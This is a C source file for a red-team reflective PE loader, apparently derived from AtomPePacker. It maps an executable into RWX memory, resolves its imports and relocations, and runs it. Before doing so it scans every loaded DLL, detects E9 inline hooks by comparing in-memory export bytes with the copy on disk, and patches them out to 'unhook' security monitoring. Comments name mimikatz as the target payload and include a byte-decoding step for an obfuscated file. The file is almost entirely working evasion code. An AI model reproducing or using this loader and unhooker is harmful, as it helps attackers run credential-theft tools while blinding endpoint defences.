//https://github.com/NUL0x4C/AtomPePacker

#include <Windows.h>
#include <psapi.h>
#include <stdio.h>

void ListLoadedModules();

typedef struct _BASE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

typedef struct _InPeConfig {
	ULONG_PTR				pPeAddress;
	SIZE_T					sPeSize;
	PIMAGE_DOS_HEADER		pDosHdr;
	PIMAGE_NT_HEADERS		pNtHdr;
	PIMAGE_DATA_DIRECTORY	pEIDataDir;		//IMAGE_DIRECTORY_ENTRY_IMPORT
	PIMAGE_DATA_DIRECTORY	pTLSDataDir;	//IMAGE_DIRECTORY_ENTRY_TLS
	PIMAGE_DATA_DIRECTORY	pEBDataDir;		//IMAGE_DIRECTORY_ENTRY_BASERELOC
	PIMAGE_DATA_DIRECTORY	pEHDataDir;		//IMAGE_DIRECTORY_ENTRY_EXCEPTION
	PIMAGE_SECTION_HEADER	pSecHdr;
} InPeConfig, * PInPeConfig;

BOOL _InitPeStruct(PInPeConfig _Pe, PVOID pPeAddress, SIZE_T sPeSize) {
	if (pPeAddress == NULL || sPeSize == NULL) {
		return FALSE;
	}
	_Pe->pPeAddress = pPeAddress;
	_Pe->sPeSize = sPeSize;
	_Pe->pDosHdr = (PIMAGE_DOS_HEADER)pPeAddress;
	if (_Pe->pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	


	_Pe->pNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pPeAddress + _Pe->pDosHdr->e_lfanew);
	if (_Pe->pNtHdr->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}
	_Pe->pEIDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	_Pe->pTLSDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	_Pe->pEBDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	_Pe->pEHDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	_Pe->pSecHdr = (PIMAGE_SECTION_HEADER)((SIZE_T)_Pe->pNtHdr + sizeof(IMAGE_NT_HEADERS));
	printf("BASE : %p\n", _Pe->pPeAddress);
	printf("Addr sec : %p\n", _Pe->pSecHdr);
	printf("Addr sec : %p\n", &_Pe->pSecHdr[6]);
	for (int i = 0; i < _Pe->pNtHdr->FileHeader.NumberOfSections; ++i) {
		printf("Section %d. PointerToRawData=%p. size=%d\n", i, _Pe->pSecHdr[i].PointerToRawData, _Pe->pSecHdr[i].SizeOfRawData);
	}
	if (_Pe->pDosHdr == NULL || _Pe->pNtHdr == NULL ||
		_Pe->pEIDataDir == NULL || _Pe->pTLSDataDir == NULL || _Pe->pEBDataDir == NULL || _Pe->pEHDataDir == NULL ||
		_Pe->pSecHdr == NULL
		) {
		return FALSE;
	}
	return TRUE;
}

BOOL _FixImportAddressTable(InPeConfig _Pe, ULONG_PTR pPeAddress) {

	PIMAGE_IMPORT_DESCRIPTOR	pImgDes = NULL;
	for (SIZE_T i = 0; i < _Pe.pEIDataDir->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
		pImgDes = (IMAGE_IMPORT_DESCRIPTOR*)(_Pe.pEIDataDir->VirtualAddress + (ULONG_PTR)pPeAddress + i);
		if (pImgDes->OriginalFirstThunk == NULL && pImgDes->FirstThunk == NULL) {
			break;
		}
		LPSTR		DllName = (LPSTR)((ULONGLONG)pPeAddress + pImgDes->Name);
		ULONG_PTR	Head = pImgDes->FirstThunk;
		ULONG_PTR	Next = pImgDes->OriginalFirstThunk;
		SIZE_T		HeadSize = 0;
		SIZE_T		NextSize = 0;
		HMODULE		hModule = LoadLibraryA(DllName);
		if (hModule == NULL) {
			return FALSE;
		}
		if (Next == NULL) {
			Next = pImgDes->FirstThunk;
		}
		while (TRUE) {
			PIMAGE_THUNK_DATA			_1stThunk = (IMAGE_THUNK_DATA*)(pPeAddress + HeadSize + Head);
			PIMAGE_THUNK_DATA			Orig1stThunk = (IMAGE_THUNK_DATA*)(pPeAddress + NextSize + Next);
			PIMAGE_IMPORT_BY_NAME		FuncName = NULL;
			ULONG_PTR					pFunction = NULL;
			if (_1stThunk->u1.Function == NULL) {
				break;
			}
			if (Orig1stThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
				PIMAGE_DOS_HEADER		_dos;
				PIMAGE_NT_HEADERS		_nt;
				PIMAGE_EXPORT_DIRECTORY	_ExportDir;
				PDWORD					_FuncAddArray;

				_dos = (PIMAGE_DOS_HEADER)hModule;
				_nt = (PIMAGE_NT_HEADERS)(((ULONG_PTR)hModule) + _dos->e_lfanew);
				_ExportDir = (PIMAGE_EXPORT_DIRECTORY)(((ULONG_PTR)hModule) + _nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
				_FuncAddArray = (PDWORD)((ULONG_PTR)hModule + _ExportDir->AddressOfFunctions);

				pFunction = ((ULONG_PTR)hModule + _FuncAddArray[Orig1stThunk->u1.Ordinal]);
				printf("Ordinal\n");
			}
			else {
				FuncName = (PIMAGE_IMPORT_BY_NAME)((SIZE_T)pPeAddress + Orig1stThunk->u1.AddressOfData);
				pFunction = (ULONG_PTR)GetProcAddress(hModule, FuncName->Name);
			}
			if (pFunction == NULL) {
				return FALSE;
			}
			_1stThunk->u1.Function = (ULONGLONG)pFunction;
			HeadSize += sizeof(IMAGE_THUNK_DATA);
			NextSize += sizeof(IMAGE_THUNK_DATA);
		}
	}
	return TRUE;
}

BOOL _ReallocationSupport(ULONG_PTR ActualAddress, ULONG_PTR PreferableAddress, PIMAGE_BASE_RELOCATION BaseRelocDir) {
	PIMAGE_BASE_RELOCATION  pImageBR = BaseRelocDir;
	ULONG_PTR				OffsetIB = ActualAddress - PreferableAddress;
	PBASE_RELOCATION_ENTRY	Reloc = NULL;
	
	while (pImageBR->VirtualAddress != 0) {
		Reloc = (PBASE_RELOCATION_ENTRY)(pImageBR + 1);
		
		while ((PBYTE)Reloc != (PBYTE)pImageBR + pImageBR->SizeOfBlock) {
			switch (Reloc->Type) {
			case IMAGE_REL_BASED_DIR64:
				*((ULONG_PTR*)(ActualAddress + pImageBR->VirtualAddress + Reloc->Offset)) += OffsetIB;
				break;
			case IMAGE_REL_BASED_HIGHLOW:
				*((DWORD*)(ActualAddress + pImageBR->VirtualAddress + Reloc->Offset)) += (DWORD)OffsetIB;
				break;
			case IMAGE_REL_BASED_HIGH:
				*((WORD*)(ActualAddress + pImageBR->VirtualAddress + Reloc->Offset)) += HIWORD(OffsetIB);
				break;
			case IMAGE_REL_BASED_LOW:
				*((WORD*)(ActualAddress + pImageBR->VirtualAddress + Reloc->Offset)) += LOWORD(OffsetIB);
				break;
			case IMAGE_REL_BASED_ABSOLUTE:
				break;
			default:
				return FALSE;
			}
			Reloc++;
		}
		pImageBR = (PIMAGE_BASE_RELOCATION)Reloc;
	}
	
	return TRUE;
}

VOID UnpackAndRunEp(PVOID pPeAddress, SIZE_T sPeSize, BOOL RunPe) {
	
	InPeConfig				_Pe1 = { 0 };
	ULONG_PTR				pAddress = NULL;
	if (!_InitPeStruct(&_Pe1, pPeAddress, sPeSize)) {
		return;
	}
	pAddress = (unsigned char*)VirtualAlloc(NULL, _Pe1.pNtHdr->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (pAddress == NULL) {
		return;
	}
	
	memcpy(pAddress, pPeAddress, _Pe1.pNtHdr->OptionalHeader.SizeOfHeaders);	


	
	for (int i = 0; i < _Pe1.pNtHdr->FileHeader.NumberOfSections; i++) {
		memcpy(pAddress + _Pe1.pSecHdr[i].VirtualAddress, (ULONG_PTR)pPeAddress + _Pe1.pSecHdr[i].PointerToRawData, _Pe1.pSecHdr[i].SizeOfRawData);
	}
	
	if (!_FixImportAddressTable(_Pe1, pAddress)) {
		return;
	}
	
	if (pAddress != _Pe1.pNtHdr->OptionalHeader.ImageBase) {
		if (!_ReallocationSupport(pAddress, _Pe1.pNtHdr->OptionalHeader.ImageBase, (PIMAGE_BASE_RELOCATION)(pAddress + _Pe1.pEBDataDir->VirtualAddress))) {
			return;
		}
	}
	
	PVOID EP = (PVOID)(pAddress + _Pe1.pNtHdr->OptionalHeader.AddressOfEntryPoint);


	ListLoadedModules();

	printf("PREPARING.....................\n");
	Sleep(10000);
	((VOID(*)())EP)();
}

unsigned char* get_file(char* filename, size_t* ret_size) {
	FILE* file = fopen(filename, "rb");
	if (file == NULL) {
		return NULL;
	}
	fseek(file, 0, SEEK_END);
	long size = ftell(file);
	fseek(file, 0, SEEK_SET);
	unsigned char* pe_mem = calloc(1, size);
	fread(pe_mem, size, 1, file);
	fclose(file);
	*ret_size = size;
	return pe_mem;
}
void* merge(PCHAR dst, PCHAR src) {
	int i = 0;
	for (int i = 0; i < 100000 && dst[i] != src[i]; ++i) {
		dst[i] = src[i];
	}
}

int ListDllFunctions(const char* dllPath, LPVOID baseAddress_infile, LPVOID baseAddress_inmem, DWORD size_text_inmem, PCHAR addr_text_inmem, PCHAR size_text_infile, PCHAR addr_text_infile, PIMAGE_SECTION_HEADER pSecHdr_inmem, PIMAGE_SECTION_HEADER pSecHdr_infile) {

	DWORD oldProtection = 0;
	DWORD oldProtectionafter = 0;
	if (pSecHdr_inmem != NULL && pSecHdr_infile != NULL) {
		int ret = VirtualProtect((LPVOID)((DWORD_PTR)baseAddress_inmem + (DWORD_PTR)pSecHdr_inmem->VirtualAddress), pSecHdr_inmem->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
		if (ret == 0) {
			printf("VirtualProtect failed\n");
			exit(-1);
		}
	}


	PIMAGE_DOS_HEADER dosHeader_inmem = (PIMAGE_DOS_HEADER)baseAddress_inmem;
	PIMAGE_DOS_HEADER dosHeader_infile = (PIMAGE_DOS_HEADER)baseAddress_infile;
	if (dosHeader_infile->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("Invalid DOS signature.\n");
		return;
	}

	PIMAGE_NT_HEADERS ntHeaders_inmem = (PIMAGE_NT_HEADERS)((BYTE*)baseAddress_inmem + dosHeader_inmem->e_lfanew);
	PIMAGE_NT_HEADERS ntHeaders_infile = (PIMAGE_NT_HEADERS)((BYTE*)baseAddress_infile + dosHeader_infile->e_lfanew);
	if (ntHeaders_infile->Signature != IMAGE_NT_SIGNATURE) {
		printf("Invalid NT signature.\n");
		return;
	}

	PIMAGE_EXPORT_DIRECTORY exportDirectory_inmem;
	PIMAGE_EXPORT_DIRECTORY exportDirectory_infile;
	DWORD exportDirRVA_inmem = ntHeaders_inmem->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	DWORD exportDirRVA_infile = ntHeaders_infile->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportDirRVA_infile == 0) {
		printf("No export table found.\n");
		return;
	}

	exportDirectory_inmem = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)baseAddress_inmem + exportDirRVA_inmem);
	exportDirectory_infile = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)baseAddress_infile + exportDirRVA_infile);

	DWORD* nameRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNames);
	DWORD* nameRVAs_infile = (DWORD*)((BYTE*)baseAddress_infile + exportDirectory_infile->AddressOfNames);

	DWORD* functionRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfFunctions);
	DWORD* functionRVAs_infile = (DWORD*)((BYTE*)baseAddress_infile + exportDirectory_infile->AddressOfFunctions);

	WORD* ordinals_inmem = (WORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNameOrdinals);
	WORD* ordinals_infile = (WORD*)((BYTE*)baseAddress_infile + exportDirectory_infile->AddressOfNameOrdinals);

	printf("Exported functions from %s:\n", dllPath);
	if (exportDirectory_infile->NumberOfNames != exportDirectory_inmem->NumberOfNames) {
		printf("Error in number of names. File has %d names while mem has %d name\n", exportDirectory_infile->NumberOfNames, exportDirectory_inmem->NumberOfNames);

		FILE* log_infile = fopen("C:\\Users\\sebastien.carre\\log_infile.txt", "w");
		FILE* log_inmem = fopen("C:\\Users\\sebastien.carre\\log_inmem.txt", "w");

		printf("Loggind %d entries for FILE\n", exportDirectory_infile->NumberOfNames);
		for (DWORD i = 0; i < exportDirectory_infile->NumberOfNames; i++) {
			char* functionName_infile = (char*)((BYTE*)baseAddress_infile + nameRVAs_infile[i]);
			fprintf(log_infile, "%s\n", functionName_infile);
		}
		printf("Loggind %d entries for MEM\n", exportDirectory_inmem->NumberOfNames);
		for (DWORD i = 0; i < exportDirectory_inmem->NumberOfNames; i++) {
			char* functionName_inmem = (char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[i]);
			fprintf(log_inmem, "%s\n", functionName_inmem);
		}
		fclose(log_infile);
		fclose(log_inmem);

		//exit(-1);
	}
	int nb_function_modified = 0;

	char** addr_inmem_c=malloc(5000 * sizeof(char *));
	char** functionName_inmem_c = malloc(5000 * sizeof(char*));
	if (addr_inmem_c == NULL || functionName_inmem_c == NULL) {
		printf("NULL argv\n");
		exit(-1);
	}

#if 0
	//save mem addresses
	for (DWORD i = 0; i < exportDirectory_infile->NumberOfNames; i++) {
		DWORD matching_i = 0;

		char* functionName_inmem;
		char* functionName_infile = (char*)((BYTE*)baseAddress_infile + nameRVAs_infile[i]);

		while (matching_i < exportDirectory_inmem->NumberOfNames) {
			functionName_inmem = (char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[matching_i]);
			if (strcmp(functionName_inmem, functionName_infile) == 0) {
				break;
			}
			matching_i++;
		}
		if (matching_i == exportDirectory_inmem->NumberOfNames) {
			printf("a function in file was not found in memory");
			exit(-1);
		}


		addr_inmem_c[i] = (char*)((BYTE*)baseAddress_inmem + functionRVAs_inmem[ordinals_inmem[matching_i]]);
		
		functionName_inmem_c[i] = functionName_inmem;
	}

	// check for identical functions
	for (int i = 0; i < exportDirectory_infile->NumberOfNames; ++i) {
		printf("%p : ", addr_inmem_c[i]);
		for (int j = 0; j < exportDirectory_infile->NumberOfNames; ++j)
		{
			if (addr_inmem_c[i] == addr_inmem_c[j]) {
				printf("  %s  ", functionName_inmem_c[j]);
			}
		}
		printf("\n");
		
	}
#endif 

	for (DWORD i = 0; i < exportDirectory_infile->NumberOfNames; i++) {
		DWORD matching_i = 0;

		char* functionName_inmem;
		char* functionName_infile = (char*)((BYTE*)baseAddress_infile + nameRVAs_infile[i]);

		while (matching_i < exportDirectory_inmem->NumberOfNames) {
			functionName_inmem = (char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[matching_i]);
			if (strcmp(functionName_inmem, functionName_infile) == 0) {
				break;
			}
			matching_i++;
		}
		if (matching_i == exportDirectory_inmem->NumberOfNames) {
			printf("a function in file was not found in memory");
			exit(-1);
		}


		char* addr_inmem = (char*)((BYTE*)baseAddress_inmem + functionRVAs_inmem[ordinals_inmem[matching_i]]);
		char* addr_infile = (char*)((BYTE*)baseAddress_infile + functionRVAs_infile[ordinals_infile[i]]);
		



		if ((long long)addr_infile >= (long long)addr_text_infile && (long long)addr_infile < ((long long)addr_text_infile + size_text_infile)) {
			if (strcmp(functionName_inmem, functionName_infile) != 0) {
				printf("Error in function name\n");
				exit(-2);
			}
			if (strcmp(functionName_inmem, functionName_infile) != 0) {
				printf("Error in function name\n");
				exit(-2);
			}
			if (addr_inmem[0] != addr_infile[0]) {
				int count = 0;
				while (count < 50)
				{
					if (addr_inmem[count] == addr_infile[count] && addr_inmem[count + 1] == addr_infile[count + 1] && addr_inmem[count + 2] == addr_infile[count + 2])
						break;
					count++;
				}

				

				//if (pSecHdr_inmem == NULL || pSecHdr_infile == NULL)
				//{
				printf("function %s (%p) in %s is modified. Restart at offset %d : ", functionName_inmem, addr_inmem, dllPath, count);
				for (int i = 0; i < count + 1; ++i) {
					printf("%02X", (unsigned char)addr_inmem[i]);
				}
				printf(" was ");
				for (int i = 0; i < count + 1; ++i) {
					printf("%02X", (unsigned char)addr_infile[i]);
				}
				printf("\n");

				//}
				if ((unsigned char)addr_inmem[0] != 0xE9) {
					printf("\t\tWARNING not E9 jump\n");
				}
				else {



					if (pSecHdr_inmem != NULL && pSecHdr_infile != NULL) {
						for (int i = 0; i < count; ++i) {
							addr_inmem[i] = addr_infile[i];
						}
					}
				}


				nb_function_modified++;
				//exit(-3);
			}
			
		}
	}
	if(nb_function_modified > 0)
		printf("\t\tNumber of function modified in %s : %d/%d\n", dllPath, nb_function_modified, exportDirectory_infile->NumberOfNames);
	printf("\n\n\n");

	if (pSecHdr_inmem != NULL && pSecHdr_infile != NULL) {
		int ret;
		ret = VirtualProtect((LPVOID)((DWORD_PTR)baseAddress_inmem + (DWORD_PTR)pSecHdr_inmem->VirtualAddress), pSecHdr_inmem->Misc.VirtualSize, oldProtection, &oldProtectionafter);
		if (ret == 0) {
			printf("VirtualProtectfailed\n");
		}
	}
	return nb_function_modified;

}


void CompareTextSection(PTCHAR szModName, char *infile, LPVOID BaseOfDll, DWORD *ret_size_text_inmem, PCHAR *ret_addr_text_inmem, DWORD *ret_size_text_infile, PCHAR *ret_addr_text_infile ) {

	PIMAGE_DOS_HEADER dosHdr_inmem = (PIMAGE_DOS_HEADER)BaseOfDll;
	PIMAGE_NT_HEADERS ntHdr_inmem = (PIMAGE_NT_HEADERS)((PBYTE)BaseOfDll + dosHdr_inmem->e_lfanew);
	PIMAGE_SECTION_HEADER pSecHdr_inmem = (PIMAGE_SECTION_HEADER)((SIZE_T)ntHdr_inmem + sizeof(IMAGE_NT_HEADERS));

	size_t sPeSize;
	unsigned char* pPeAddress = infile;
	PIMAGE_DOS_HEADER dosHdr_infile = (PIMAGE_DOS_HEADER)pPeAddress;
	PIMAGE_NT_HEADERS ntHdr_infile = (PIMAGE_NT_HEADERS)((PBYTE)BaseOfDll + dosHdr_infile->e_lfanew);
	PIMAGE_SECTION_HEADER pSecHdr_infile = (PIMAGE_SECTION_HEADER)((SIZE_T)ntHdr_inmem + sizeof(IMAGE_NT_HEADERS));

	
	DWORD size_text_infile=0;
	PCHAR addr_text_infile;
	for (int i = 0; i < ntHdr_infile->FileHeader.NumberOfSections; i++) {
		char sectionName[9] = { 0 };
		strncpy(sectionName, (char*)pSecHdr_infile[i].Name, 8);
		if (strcmp(".text", sectionName) == 0) {
			addr_text_infile = (ULONG_PTR)pPeAddress + pSecHdr_infile[i].PointerToRawData;
			size_text_infile = pSecHdr_infile[i].SizeOfRawData;
			break;
		}
	}

	DWORD size_text_inmem=0;
	PCHAR addr_text_inmem;
	for (int i = 0; i < ntHdr_inmem->FileHeader.NumberOfSections; i++) {
		char sectionName[9] = { 0 };
		strncpy(sectionName, (char*)pSecHdr_inmem[i].Name, 8);
		if (strcmp(".text", sectionName) == 0) {
			addr_text_inmem = (ULONG_PTR)BaseOfDll + pSecHdr_inmem[i].VirtualAddress;
			size_text_inmem = pSecHdr_inmem[i].SizeOfRawData;
			break;
		}
	}


	if (size_text_infile != 0 && size_text_inmem != 0 && size_text_infile == size_text_inmem) {
		*ret_addr_text_infile = addr_text_infile;
		*ret_size_text_infile = size_text_infile;
		*ret_addr_text_inmem = addr_text_inmem;
		*ret_size_text_inmem = size_text_inmem;
		//Sleep(10000);		

		if (ListDllFunctions(szModName, infile, BaseOfDll, size_text_inmem, addr_text_inmem, size_text_infile, addr_text_infile, NULL, NULL) > 0) {
			printf("Patching...\n");
			ListDllFunctions(szModName, infile, BaseOfDll, size_text_inmem, addr_text_inmem, size_text_infile, addr_text_infile, pSecHdr_inmem, pSecHdr_infile);
			printf("Check :\n");
			if (ListDllFunctions(szModName, infile, BaseOfDll, size_text_inmem, addr_text_inmem, size_text_infile, addr_text_infile, NULL, NULL) > 0) {
				printf("FAILED UNHOOK\n");
				exit(-1);
			}
		}
		return;
	}
	else {
		printf("Error sizes are incorrect");
		exit(-1);
	}
}

void ListLoadedModules() {
	HANDLE processHandle = GetCurrentProcess();
	HMODULE hMods[1024];
	DWORD cbNeeded;
	unsigned int i;


	TCHAR current_bin_path[1024];
	DWORD size = GetModuleFileName(NULL, current_bin_path, 1024);


	if (EnumProcessModules(processHandle, hMods, sizeof(hMods), &cbNeeded)) {
		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
			MODULEINFO modInfo;
			TCHAR szModName[MAX_PATH];

			if (GetModuleInformation(processHandle, hMods[i], &modInfo, sizeof(modInfo))) {
				if (GetModuleFileNameEx(processHandle, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
					if (strcmp(current_bin_path, szModName) != 0) {

						DWORD size_text_inmem;
						PCHAR addr_text_inmem;
						DWORD size_text_infile;
						PCHAR addr_text_infile;
						
						size_t sPeSize;
						unsigned char* infile = get_file(szModName, &sPeSize);
						if (infile == NULL ) {
							printf("Ignoring %s\n", szModName);
							continue;
						}
						else {
							printf("Analysing %s\n", szModName);
						}
											
						CompareTextSection(szModName, infile,modInfo.lpBaseOfDll,&size_text_inmem, &addr_text_inmem, &size_text_infile, &addr_text_infile);
						
						
						
						
					}
				}
			}
		}
	}
}
// exemple: mimikatz
int main(int argc, char *argv[]) {

		//create_box();
		size_t len;
		//unsigned char* raw = get_file("C:\\Users\\sebastien.carre\\Downloads\\testrt\\REDTEAM_PE_Reflective\\x64\\Release\\simplelist.exe",&len);
		
		unsigned char* raw = get_file("C:\\Windows\\System32\\calc.exe", &len);
		
		
		/*unsigned char* raw = get_file("C:\\Users\\sebastien.carre\\Downloads\\seb.txt", &len);
		for (size_t i = 0; i < len; ++i) {
			raw[i] = raw[i] - 1;
		}*/
		UnpackAndRunEp(raw, len, TRUE);
	
	
	return 0;
}